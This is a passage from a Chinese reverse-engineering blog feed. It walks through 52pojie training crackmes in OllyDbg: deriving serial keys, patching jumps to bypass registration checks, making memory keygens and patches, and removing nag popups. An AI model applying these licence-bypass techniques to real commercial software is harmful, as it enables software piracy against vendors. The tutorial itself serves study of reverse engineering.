eax,ecx                              ;  str[0]-1==str[4]</span><br><span class="line">004022EF  |.  75 69             jnz short 吾爱破解.0040235A                  ;  不能跳</span><br></pre></td></tr></table></figure><p>字符串中第1个字符要比第5个字符大1，修改修改继续。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004022F1  |.  0FBE85 FCFEFFFF   movsx eax,byte ptr ss:[ebp-0x104]        ;  eax=输入的第9个字符</span><br><span class="line">004022F8  |.  83C1 02           add ecx,0x2</span><br><span class="line">004022FB  |.  3BC8              cmp ecx,eax                              ;  str[8]==str[4]+2</span><br><span class="line">004022FD  |.  75 5B             jnz short 吾爱破解.0040235A</span><br></pre></td></tr></table></figure><p>字符串中第9个字符要比第5个字符大2，修改修改继续。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">004022FF  |.  80F2 54           xor dl,0x54                              ;  dl是第5个字符</span><br><span class="line">00402302  |.  80FA 66           cmp dl,0x66                              ;  第5个字符与0x54异或要等于0x66</span><br><span class="line">00402305  |.  75 53             jnz short 吾爱破解.0040235A</span><br></pre></td></tr></table></figure><p>所以第5个字符是0x32(‘2’)，也可以推算出，第1个字符是’3’，第9个字符是’4’。修改修改再继续。push了3个参数，第一个参数是长度，第二个参数是”MjM”，第三个参数是字符串的第2个字符的地址。猜测这个函数是比较2-4位是否为”MjM”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00402307  |.  6A 03             push 0x3</span><br><span class="line">00402309  |.  8D85 F5FEFFFF     lea eax,dword ptr ss:[ebp-0x10B]         ;  eax=字符串的第2个字符地址</span><br><span class="line">0040230F  |.  68 3C465400       push 吾爱破解.0054463C                       ;  MjM</span><br><span class="line">00402314  |.  50                push eax</span><br><span class="line">00402315  |.  E8 76991100       call 吾爱破解.0051BC90</span><br><span class="line">0040231A  |.  83C4 0C           add esp,0xC</span><br><span class="line">0040231D  |.  85C0              test eax,eax</span><br><span class="line">0040231F  |.  75 39             jnz short 吾爱破解.0040235A</span><br></pre></td></tr></table></figure><p>修改一下试试。跳转没有实现，猜测正确。下面是一样的步骤。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00402321  |.  6A 03             push 0x3</span><br><span class="line">00402323  |.  8D85 F9FEFFFF     lea eax,dword ptr ss:[ebp-0x107]         ;  eax=第6个字符地址</span><br><span class="line">00402329  |.  68 40465400       push 吾爱破解.00544640                       ;  UXJ</span><br><span class="line">0040232E  |.  50                push eax</span><br><span class="line">0040232F  |.  E8 5C991100       call 吾爱破解.0051BC90</span><br><span class="line">00402334  |.  83C4 0C           add esp,0xC</span><br><span class="line">00402337  |.  85C0              test eax,eax</span><br><span class="line">00402339  |.  75 1F             jnz short 吾爱破解.0040235A</span><br></pre></td></tr></table></figure><p>综上，注册表的注册码为<code>3MjM2UXJ4</code>。</p><p>完整注册码为<code>ITN3UXJGJ-jN2UXJxEjM2UXJ-3MjM2UXJ4</code>，得到彩蛋。</p><img src="/posts/bb44dc0/%E5%BD%A9%E8%9B%8B2.png" class="" title="彩蛋2"><img src="/posts/bb44dc0/%E6%88%91%E6%98%AF%E5%BD%A9%E8%9B%8B.png" class="" title="彩蛋2"><p>点击“我是彩蛋”有一连串的弹窗提示。这些弹窗语句早在我们搜索字符串的时候就已经看到了。</p><img src="/posts/bb44dc0/%E6%90%9C%E7%B4%A2%E5%AD%97%E7%AC%A6%E4%B8%B22.png" class="" title="搜索字符串"><p>Key1=ITN3UXJGJ-jN2UXJxEjM2UXJ-3MjM2UXJ4</p><p>Key2_1=4JXU2MjM3-JXU2MjExJXU2Nj-JGJXU3NTl</p><p>Key2_2=3MjM2UXJ4-jN2UXJxEjM2UXJ-ITN3UXJGJ</p><p>Key2_3=JGJXU3NTl-JXU2MjExJXU2Nj-4JXU2MjM3</p><p>Key2的所有数字之和长度之间的差为4，且比长度大。所以彩蛋Key长度为12。</p><p>Key的倒数第二位为2，最后一位为=。Key=00000000002=</p><p>Key的第一位是什么呢？B，我们经常说的，NB！Key=N0000000002=</p><p>Key的倒数第三位是Key2的第三位？J、j、X？</p><p>Key的第二位为管理员名字的首字母，管理员是Hmily，所以是H，Key=NH000000002=</p><p>Key的第三位和第九位一样，都是第五位的小写字母。</p><p>好难猜啊…我看到答案是NHlkLXpdIU2=，但完全不知道怎么得来的。</p><h1 id="5-给程序打补丁"><a href="#5-给程序打补丁" class="headerlink" title="5. 给程序打补丁"></a>5. 给程序打补丁</h1><p>吾爱破解内存补丁生成器V1.00：做程序补丁</p><p>KeyMake V2.0 修改版：做内存注册机</p><img src="/posts/bb44dc0/%E6%B3%A8%E5%86%8C%E5%A4%B1%E8%B4%A5.png" class="" title="注册失败"><p>拉进OD，查找敏感字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0040342B  |. /75 07         jnz short 第六课例.00403434</span><br><span class="line">0040342D  |. |68 78E15700   push 第六课例.0057E178                       ;  注册成功</span><br><span class="line">00403432  |. |EB 10         jmp short 第六课例.00403444</span><br><span class="line">00403434  |&gt; \68 84E15700   push 第六课例.0057E184                       ;  注册失败</span><br><span class="line">00403439  |.  EB 09         jmp short 第六课例.00403444</span><br><span class="line">0040343B  |&gt;  6A 00         push 0x0</span><br><span class="line">0040343D  |.  6A 00         push 0x0</span><br><span class="line">0040343F  |.  68 6CE15700   push 第六课例.0057E16C                       ;  输入为空</span><br><span class="line">00403444  |&gt;  E8 67080100   call 第六课例.00413CB0</span><br></pre></td></tr></table></figure><p>爆破补丁版：将地址为<code>40342B</code>的<code>jnz</code>直接修改为<code>jz</code>或<code>nop</code>即可。</p><p>那如果使用吾爱破解内存补丁生成器V1.00爆破要怎么操作呢？找到需要修改的地址后，打开补丁生成器，将程序拖入补丁生成器中，输入内存地址和需要修改成什么指令，添加指令，导出补丁。</p><img src="/posts/bb44dc0/%E8%A1%A5%E4%B8%81.png" class="" title="打补丁"><p>关闭OD后打开补丁程序，点击“开始补丁”就会自动运行补丁程序，此时输入什么都可以注册成功了。</p><img src="/posts/bb44dc0/%E8%A1%A5%E4%B8%81%E6%88%90%E5%8A%9F.png" class="" title="打补丁"><p>注册机版：向上划到段首下断运行，F8单步到此处。寄存器窗口和堆栈窗口都可看到真正的注册码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00403400  |&gt; /8A10          /mov dl,byte ptr ds:[eax]                ;  eax指向真正的注册码</span><br><span class="line">00403402  |. |3A11          |cmp dl,byte ptr ds:[ecx]                ;  ecx指向输入的注册码</span><br><span class="line">00403404  |. |75 1A         |jnz short 第六课例.00403420</span><br><span class="line">00403406  |. |84D2          |test dl,dl</span><br><span class="line">00403408  |. |74 12         |je short 第六课例.0040341C</span><br><span class="line">0040340A  |. |8A50 01       |mov dl,byte ptr ds:[eax+0x1]</span><br><span class="line">0040340D  |. |3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]</span><br><span class="line">00403410  |. |75 0E         |jnz short 第六课例.00403420</span><br><span class="line">00403412  |. |83C0 02       |add eax,0x2</span><br><span class="line">00403415  |. |83C1 02       |add ecx,0x2</span><br><span class="line">00403418  |. |84D2          |test dl,dl</span><br><span class="line">0040341A  |.^\75 E4         \jnz short 第六课例.00403400</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0012F6EC   186B4420</span><br><span class="line">0012F6F0   00000111</span><br><span class="line">0012F6F4   00000000</span><br><span class="line">0012F6F8   00194078  ASCII &quot;202CB962AC59075B964B07152D234B70&quot;</span><br><span class="line">0012F6FC   00194078  ASCII &quot;202CB962AC59075B964B07152D234B70&quot;</span><br><span class="line">0012F700   00192828  ASCII &quot;852&quot;</span><br><span class="line">0012F704   001927B8  ASCII &quot;123&quot;</span><br></pre></td></tr></table></figure><p>记下运行到<code>403400</code>，真正的注册码存在了寄存器窗口的eax的值(注册码字符串的首地址)里。</p><p>打开Keymake，其它-&gt;内存注册机，将需要制作注册机的程序加载进来，添加。编辑信息-&gt;添加-&gt;生成。</p><img src="/posts/bb44dc0/%E6%B3%A8%E5%86%8C%E6%9C%BA.png" class="" title="注册机"><p>运行注册机，发现需要两个框都填了才能给注册码，否则提示“输入为空”。为了美观，也可将<code>004033A7</code>的跳转指令nop掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00403384  |.  50            push eax                                 ;  将用户名入栈</span><br><span class="line">00403385  |.  8D8F 30010000 lea ecx,dword ptr ds:[edi+0x130]</span><br><span class="line">0040338B  |.  E8 12630100   call 第六课例.004196A2</span><br><span class="line">00403390  |.  8B45 EC       mov eax,[local.5]                        ;  eax=用户名</span><br><span class="line">00403393  |.  83CF FF       or edi,-0x1</span><br><span class="line">00403396  |.  8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0</span><br><span class="line">0040339A  |.  0F84 9B000000 je 第六课例.0040343B                         ;  用户名为空跳转</span><br><span class="line">004033A0  |.  8B45 E8       mov eax,[local.6]</span><br><span class="line">004033A3  |.  8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0</span><br><span class="line">004033A7  |.  0F84 8E000000 je 第六课例.0040343B                         ;  注册码为空跳转</span><br></pre></td></tr></table></figure><p>nop掉后再生成注册机。虽然不会提示“输入为空”，但也会提示“注册失败”字样，暂时没有什么好的办法，就这样吧。(提示“输入为空”比“注册失败”要好，还是别改了吧)</p><img src="/posts/bb44dc0/%E6%B3%A8%E5%86%8C%E7%A0%812.png" class="" title="注册码"><p>也可以用Keymake制作内存补丁，<a href="https://www.bilibili.com/video/BV1cw411Z7Ab?p=22">Shark恒 制作内存补丁</a> 。</p><h1 id="6-打补丁作业"><a href="#6-打补丁作业" class="headerlink" title="6. 打补丁作业"></a>6. 打补丁作业</h1><p>程序加了VMProtect壳。VMProtect 是软件保护系统，将保护后的代码放到虚拟机中运行，这将使分析反编译后的代码和破解变得极为困难。这个我目前还不会手脱，那就在有壳的基础上修改吧。</p><p>F9运行程序跑起来，进入OD的<code>E</code>模块，双击进入程序代码块(.exe)。取消分析，智能搜索发现字符串都能看到了。搜索敏感字符串进入反汇编代码，还是熟悉的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0040346B   /75 07           jnz short 吾爱破解.00403474</span><br><span class="line">0040346D   |68 80E15700     push 吾爱破解.0057E180                       ; 注册成功</span><br><span class="line">00403472   |EB 10           jmp short 吾爱破解.00403484</span><br><span class="line">00403474   \68 8CE15700     push 吾爱破解.0057E18C                       ; 注册失败</span><br><span class="line">00403479    EB 09           jmp short 吾爱破解.00403484</span><br><span class="line">0040347B    6A 00           push 0x0</span><br><span class="line">0040347D    6A 00           push 0x0</span><br><span class="line">0040347F    68 6CE15700     push 吾爱破解.0057E16C                       ; 输入为空</span><br><span class="line">00403484    E8 78080100     call 吾爱破解.00413D01</span><br></pre></td></tr></table></figure><p>爆破补丁版：</p><p>但发现这样nop后保存文件会提示“无法定位数据”。</p><img src="/posts/bb44dc0/%E6%97%A0%E6%B3%95%E5%AE%9A%E4%BD%8D%E6%95%B0%E6%8D%AE.png" class="" title="无法定位数据"><p>这时就需要吾爱破解内存补丁生成器V1.00了。<code>jnz</code>的机器码为0x75，<code>je</code>指令为0x74，<code>nop</code>的机器码为0x90。关闭OD再运行补丁。</p><p>注册机版：</p><p>由于程序有壳，无法重新载入，但还是可以在这个函数中一步步运行程序到算法处，按照5的方法生成注册机即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00403440  |&gt;  8A10          /mov dl,byte ptr ds:[eax];真正注册码</span><br><span class="line">00403442  |. |3A11          |cmp dl,byte ptr ds:[ecx];输入的字符串</span><br><span class="line">00403444  |. |75 1A         |jnz short 吾爱破解.00403460</span><br><span class="line">00403446  |. |84D2          |test dl,dl</span><br><span class="line">00403448  |. |74 12         |je short 吾爱破解.0040345C</span><br><span class="line">0040344A  |. |8A50 01       |mov dl,byte ptr ds:[eax+0x1]</span><br><span class="line">0040344D  |. |3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]</span><br><span class="line">00403450  |. |75 0E         |jnz short 吾爱破解.00403460</span><br><span class="line">00403452  |. |83C0 02       |add eax,0x2</span><br><span class="line">00403455  |. |83C1 02       |add ecx,0x2</span><br><span class="line">00403458  |. |84D2          |test dl,dl</span><br><span class="line">0040345A  |.^\75 E4         \jnz short 吾爱破解.00403440</span><br></pre></td></tr></table></figure><p>分析算法：</p><p>在段首下断，输入用户名和注册码后运行，程序停在断点处。F8一步步跟，分析每一步程序做了什么。执行完<code>4033BF</code>地址的指令后，可以看到堆栈窗口中用户名和“123456”拼接在一起。</p><img src="/posts/bb44dc0/%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2.png" class="" title="连接字符串"><p>执行完<code>4033FE</code>地址的指令后，堆栈窗口出现真正的注册码。</p><img src="/posts/bb44dc0/%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C%E7%A0%81.png" class="" title="真正的注册码"><p>那我们进去看看它是怎么生成的。看到这一大段就应该意识到这是MD5的初始化处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00401B55    C745 D8 0000000&gt;mov dword ptr ss:[ebp-0x28],0x0</span><br><span class="line">00401B5C    C745 D4 0000000&gt;mov dword ptr ss:[ebp-0x2C],0x0</span><br><span class="line">00401B63    C745 DC 0123456&gt;mov dword ptr ss:[ebp-0x24],0x67452301</span><br><span class="line">00401B6A    C745 E0 89ABCDE&gt;mov dword ptr ss:[ebp-0x20],0xEFCDAB89</span><br><span class="line">00401B71    C745 E4 FEDCBA9&gt;mov dword ptr ss:[ebp-0x1C],0x98BADCFE</span><br><span class="line">00401B78    C745 E8 7654321&gt;mov dword ptr ss:[ebp-0x18],0x10325476</span><br><span class="line">00401B7F    C645 FC 02      mov byte ptr ss:[ebp-0x4],0x2</span><br><span class="line">00401B83    8B45 08         mov eax,dword ptr ss:[ebp+0x8]</span><br><span class="line">00401B86    8B70 F4         mov esi,dword ptr ds:[eax-0xC]</span><br></pre></td></tr></table></figure><p>传入的参数是用户名和“123456”拼接，所以密码是MD5(用户名+”123456”)。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-课前预习&quot;&gt;&lt;a href=&quot;#1-课前预习&quot; class=&quot;headerlink&quot; title=&quot;1. 课前预习&quot;&gt;&lt;/a&gt;1. 课前预习&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;熟悉OD字符串插件的使用&lt;br&gt;右键或插件-&amp;gt;中文搜索引擎-&amp;gt;智能搜索，Ctrl+F搜索字符串。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;熟悉OD如何下断点&lt;br&gt;Ctrl+G，直接搜索API下断&lt;br&gt;Ctrl+N，输入表搜索API-&amp;gt;右键-&amp;gt;在每个参考上设置断点&lt;br&gt;利用插件，ApiBreak和API断点设置工具都可以&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第二三课——去弹窗、主页锁定及DIY</title>
    <link href="http://example.com/posts/7cd35487.html"/>
    <id>http://example.com/posts/7cd35487.html</id>
    <published>2022-04-05T01:29:28.102Z</published>
    <updated>2022-04-11T05:25:57.704Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-了解Windows-API"><a href="#1-了解Windows-API" class="headerlink" title="1. 了解Windows API"></a>1. 了解Windows API</h1><p>消息框：MessageBoxA/W（Ansi[ASCII]/WideChar[Unicode]）</p><p>弹页面：</p><p>ShellExecuteA/W：open url——控制台执行</p><span id="more"></span><p>WinExec：explorer.exe url——Windows执行</p><p>CreateProcessA/W：PATH url——创建进程</p><p>注册表相关：RegCreateKeyExA/W、RegOpenKeyExA/W、RegDeleteKeyExA/W</p><p>创建线程：CreateThread</p><h1 id="2-实例一"><a href="#2-实例一" class="headerlink" title="2. 实例一"></a>2. 实例一</h1><p>简单的UPX壳，先脱壳才能查找字符串、去除弹窗。</p><p>脱壳后程序运行，出现一个弹窗，再出现弹页面。弹窗点确定后，出现主程序，不一会儿又弹出一个页面，再一会儿后又弹出一个页面。</p><p>目标：去除NAG，只剩一个主程序(课程介绍的链接不用去除)。</p><p>首先去除弹窗。弹窗关键字符串“来试试我的程序啊”。脱壳后的程序载入OD，右键-&gt;中文搜索引擎-&gt;智能搜索。双击关键字符串去到反汇编窗口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">004014BA    C3              retn;上个函数结束</span><br><span class="line">004014BB    56              push esi;关键字符串函数开始</span><br><span class="line">004014BC    57              push edi</span><br><span class="line">004014BD    6A 67           push 0x67</span><br><span class="line">004014BF    6A 00           push 0x0</span><br><span class="line">004014C1    FF15 3C204000   call dword ptr ds:[&lt;&amp;kernel32.#GetNamedPipeHa&gt;; kernel32.GetModuleHandleW</span><br><span class="line">004014C7    50              push eax</span><br><span class="line">004014C8    FF15 E8204000   call dword ptr ds:[&lt;&amp;user32.#445&gt;]            ; user32.LoadIconW</span><br><span class="line">004014CE    8B75 08         mov esi,dword ptr ss:[ebp+0x8]                ; dumped_.&lt;ModuleEntryPoint&gt;</span><br><span class="line">004014D1    50              push eax</span><br><span class="line">004014D2    6A 00           push 0x0</span><br><span class="line">004014D4    68 80000000     push 0x80</span><br><span class="line">004014D9    56              push esi</span><br><span class="line">004014DA    FF15 F4204000   call dword ptr ds:[&lt;&amp;user32.#577&gt;]            ; user32.SendMessageW</span><br><span class="line">004014E0    6A 00           push 0x0</span><br><span class="line">004014E2    68 70214000     push dumped_.00402170                         ; 52PoJie</span><br><span class="line">004014E7    68 80214000     push dumped_.00402180                         ; 来试试我的程序啊</span><br><span class="line">004014EC    56              push esi</span><br><span class="line">004014ED    FF15 EC204000   call dword ptr ds:[&lt;&amp;user32.#484&gt;]            ; user32.MessageBoxW</span><br><span class="line">004014F3    8B3D 18204000   mov edi,dword ptr ds:[&lt;&amp;kernel32.#CreateThrea&gt;; kernel32.CreateThread</span><br><span class="line">004014F9    6A 00           push 0x0</span><br><span class="line">004014FB    6A 00           push 0x0</span><br><span class="line">004014FD    6A 00           push 0x0</span><br><span class="line">004014FF    68 A0104000     push dumped_.004010A0</span><br><span class="line">00401504    6A 00           push 0x0</span><br><span class="line">00401506    6A 00           push 0x0</span><br><span class="line">00401508    FFD7            call edi</span><br><span class="line">0040150A    6A 00           push 0x0</span><br><span class="line">0040150C    6A 00           push 0x0</span><br><span class="line">0040150E    6A 00           push 0x0</span><br><span class="line">00401510    68 90124000     push dumped_.00401290</span><br><span class="line">00401515    6A 00           push 0x0</span><br><span class="line">00401517    6A 00           push 0x0</span><br><span class="line">00401519    FFD7            call edi</span><br><span class="line">0040151B    68 98214000     push dumped_.00402198                         ; 吾爱破解培训第二课实例一\r\n本程序会有一个弹窗和三次弹网页操作\r\n请把广告去除，加油！</span><br><span class="line">00401520    68 E9030000     push 0x3E9</span><br><span class="line">00401525    56              push esi</span><br><span class="line">00401526    FF15 F0204000   call dword ptr ds:[&lt;&amp;user32.#597&gt;]            ; user32.SetDlgItemTextW</span><br><span class="line">0040152C    5F              pop edi                                       ; kernel32.7C817077</span><br><span class="line">0040152D    5E              pop esi                                       ; kernel32.7C817077</span><br><span class="line">0040152E    33C0            xor eax,eax</span><br><span class="line">00401530    5D              pop ebp                                       ; kernel32.7C817077</span><br><span class="line">00401531    C3              retn;关键字符串函数结束</span><br></pre></td></tr></table></figure><p>从上面的代码可知，NAG窗口函数与主程序函数在一个父函数中，父函数中没有跳转语句，所以不能靠跳转绕过NAG，试一下nop掉NAG相关代码。</p><p>程序运行到NAG的call指令，堆栈窗口显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012FCB8   002A074C  |hOwner = 002A074C (&#x27;吾爱破解培训第二课实例一&#x27;,class=&#x27;#32770&#x27;)</span><br><span class="line">0012FCBC   00402180  |Text = &quot;来试试我的程序啊&quot;</span><br><span class="line">0012FCC0   00402170  |Title = &quot;52PoJie&quot;</span><br><span class="line">0012FCC4   00000000  \Style = MB_OK|MB_APPLMODAL</span><br></pre></td></tr></table></figure><p>即运行这个函数前有4个参数压栈，也就是call前面的4个<code>push</code>指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004014E0    6A 00           push 0x0</span><br><span class="line">004014E2    68 70214000     push dumped_.00402170                         ; 52PoJie</span><br><span class="line">004014E7    68 80214000     push dumped_.00402180                         ; 来试试我的程序啊</span><br><span class="line">004014EC    56              push esi</span><br><span class="line">004014ED    FF15 EC204000   call dword ptr ds:[&lt;&amp;user32.#484&gt;]            ; user32.MessageBoxW</span><br></pre></td></tr></table></figure><p>重载，将这5条指令用nop填充，运行，发现NAG窗口消失了。复制到可执行文件，保存。在此程序的基础上去除页面。</p><p>3个NAG页面分别为：<a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a> 、<a href="https://www.52pojie.cn/forum-5-1.html">https://www.52pojie.cn/forum-5-1.html</a> 、<a href="http://www.52pojie.cn/forum-68-1.html">http://www.52pojie.cn/forum-68-1.html</a> 。</p><p>查找关键字符串，可看到其中一个NAG页面 <a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a> 。同样，没有跳转指令，用nop填充，操作与NAG弹窗一样。保存，载入新程序。</p><p>我们知道，弹页面用的是ShellExecuteA/W、WinExec、CreateProcessA/W几个函数。Ctrl+G搜索这些函数下断。F9运行，等待一会儿，程序断在某个函数处。Alt+F9返回，程序运行到用户领空的下一指令，看到弹出页面 <a href="https://www.52pojie.cn/forum-5-1.html">https://www.52pojie.cn/forum-5-1.html</a> ，也看到了函数调用。由于又没有跳转指令，依旧用nop。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040125C    6A 05           push 0x5</span><br><span class="line">0040125E    53              push ebx</span><br><span class="line">0040125F    FF15 10204000   call dword ptr ds:[&lt;&amp;kernel32.#WriteCons&gt;; kernel32.WinExec</span><br></pre></td></tr></table></figure><p>保存，载入新程序。</p><p>依旧那几个函数，Alt+F9返回后弹出页面 <a href="http://www.52pojie.cn/forum-68-1.html">http://www.52pojie.cn/forum-68-1.html</a> 。将刚才几个函数的断点去掉，在call指令处下断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040143B    FF15 20204000   call dword ptr ds:[&lt;&amp;kernel32.#CreatePro&gt;; kernel32.CreateProcessA</span><br></pre></td></tr></table></figure><p>F9运行，查看堆栈窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00C3FEC4   00000000  |ModuleFileName = NULL</span><br><span class="line">00C3FEC8   003A4210  |CommandLine = &quot;C:\Program Files\Internet Explorer\iexplore.exe http://www.52pojie.cn/forum-68-1.html&quot;</span><br><span class="line">00C3FECC   00000000  |pProcessSecurity = NULL</span><br><span class="line">00C3FED0   00000000  |pThreadSecurity = NULL</span><br><span class="line">00C3FED4   00000000  |InheritHandles = FALSE</span><br><span class="line">00C3FED8   00000000  |CreationFlags = 0</span><br><span class="line">00C3FEDC   00000000  |pEnvironment = NULL</span><br><span class="line">00C3FEE0   00000000  |CurrentDir = NULL</span><br><span class="line">00C3FEE4   00C3FEF8  |pStartupInfo = 00C3FEF8</span><br><span class="line">00C3FEE8   00C3FF3C  \pProcessInfo = 00C3FF3C</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00401403    E8 C2090000     call &lt;jmp.&amp;msvcr100.#1492&gt;</span><br><span class="line">00401408    83C4 0C         add esp,0xC</span><br><span class="line">0040140B    8D55 88         lea edx,dword ptr ss:[ebp-0x78]</span><br><span class="line">0040140E    52              push edx</span><br><span class="line">0040140F    8D85 44FFFFFF   lea eax,dword ptr ss:[ebp-0xBC]</span><br><span class="line">00401415    50              push eax</span><br><span class="line">00401416    6A 00           push 0x0</span><br><span class="line">00401418    6A 00           push 0x0</span><br><span class="line">0040141A    6A 00           push 0x0</span><br><span class="line">0040141C    6A 00           push 0x0</span><br><span class="line">0040141E    6A 00           push 0x0</span><br><span class="line">00401420    6A 00           push 0x0</span><br><span class="line">00401422    53              push ebx</span><br><span class="line">00401423    B9 01000000     mov ecx,0x1</span><br><span class="line">00401428    6A 00           push 0x0</span><br><span class="line">0040142A    C785 70FFFFFF 0&gt;mov dword ptr ss:[ebp-0x90],0x1</span><br><span class="line">00401434    66:898D 74FFFFF&gt;mov word ptr ss:[ebp-0x8C],cx</span><br><span class="line">0040143B    FF15 20204000   call dword ptr ds:[&lt;&amp;kernel32.#CreatePro&gt;; kernel32.CreateProcessA</span><br></pre></td></tr></table></figure><p>将<code>push edx</code>及下面的指令全都nop掉，保存。至此，所有NAG都被清除。</p><h1 id="3-实例二"><a href="#3-实例二" class="headerlink" title="3. 实例二"></a>3. 实例二</h1><p>ASPack壳，用ESP定律很快到达OEP，脱壳，用FixRes重构一下资源。</p><p>运行程序，程序会将IE主页修改为 <a href="http://www.52pojie.cn/">http://www.52pojie.cn/</a> 